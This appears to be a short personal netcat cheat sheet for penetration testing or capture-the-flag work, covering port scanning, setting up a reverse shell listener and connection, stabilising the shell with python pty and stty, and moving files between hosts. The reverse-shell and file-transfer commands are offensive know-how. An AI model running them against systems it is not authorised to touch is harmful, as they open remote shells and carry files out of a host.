# Nc
# Port scan
```
nc -zv $ip 1-1000 2>&1 | grep -v failed
```

# Reverse shell
```
nc -lvnp <port-number>
```
```
nc <target-ip> <chosen-port>
```

# Shell stabilization
## Shell stabilization via python
```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
^Z
stty raw -echo; fg
```
## Shell stabilization via rlwrap
```
sudo apt install rlwrap
rlwrap nc -lvnp <port>
^Z
stty raw -echo; fg
```
# Setting rows and columns
```
Information from local machine
stty -a

Set rows and columns in reverse shell
stty rows <number>
stty cols <number>
```

# File transfer

```
Receiver:
nc -lvnp 1234 > file

Sender:
nc -w 3 $ip 1234 < file
```